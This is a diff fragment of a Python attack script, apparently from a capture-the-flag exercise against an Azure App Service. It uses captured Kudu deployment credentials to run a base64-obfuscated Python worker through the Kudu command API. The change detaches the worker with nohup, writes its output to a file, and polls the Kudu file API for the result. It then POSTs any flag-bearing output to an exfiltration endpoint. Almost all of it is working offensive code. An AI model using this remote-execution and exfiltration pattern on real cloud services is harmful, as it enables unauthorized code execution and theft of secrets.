@@ -84,14 +84,25 @@ req = urllib.request.Request(flag_url, headers={"Authorization": "Bearer " + tok
 print(urllib.request.urlopen(req, timeout=25).read().decode())
 """
 encoded = base64.b64encode(worker.encode()).decode()
-command = "python3 -c \"import base64;exec(base64.b64decode('" + encoded + "').decode())\""
+command = "nohup python3 -c \"import base64;exec(base64.b64decode('" + encoded + "').decode())\" > /home/site/wwwroot/ctf_flag_result 2>&1 </dev/null &"
 body = json.dumps({"command": command, "dir": "site/wwwroot"}).encode()
 auth = base64.b64encode((ku + ":" + kp).encode()).decode()
 req = urllib.request.Request("https://" + APP + ".scm.azurewebsites.net/api/command", data=body, method="POST", headers={"Authorization": "Basic " + auth, "Content-Type": "application/json"})
-result = urllib.request.urlopen(req, timeout=180).read()
+result = urllib.request.urlopen(req, timeout=40).read()
 print(result.decode())
-try:
-    urllib.request.urlopen(urllib.request.Request(EXF, data=result, method="POST", headers={"Content-Type": "application/json"}), timeout=20).read()
-except Exception:
-    pass
+# Poll Kudu VFS for the detached worker result.
+result_url = "https://" + APP + ".scm.azurewebsites.net/api/vfs/site/wwwroot/ctf_flag_result"
+last = b""
+for _ in range(36):
+    try:
+        rr = urllib.request.Request(result_url, headers={"Authorization": "Basic " + auth})
+        last = urllib.request.urlopen(rr, timeout=20).read()
+        text = last.decode(errors="replace")
+        if text.strip() and ("DF26{" in text or "flag" in text.lower() or "value" in text.lower() or "Traceback" in text):
+            print(text)
+            urllib.request.urlopen(urllib.request.Request(EXF, data=last, method="POST", headers={"Content-Type": "application/json"}), timeout=20).read()
+            break
+    except Exception:
+        pass
+    time.sleep(5)
 PY
